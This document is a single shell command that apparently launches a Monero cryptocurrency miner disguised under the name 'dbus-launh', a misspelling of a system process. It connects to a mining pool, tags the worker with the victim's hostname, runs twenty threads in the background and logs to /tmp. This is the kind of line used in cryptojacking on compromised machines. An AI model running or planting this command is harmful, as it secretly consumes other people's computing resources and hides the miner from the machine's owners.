./dbus-launh --donate-level 1 -a rx/0 -o xmr.ss.dxpool.com:5555 -u googlecn.`hostname` -p 112 -t 20 -k -l /tmp/b.log -B
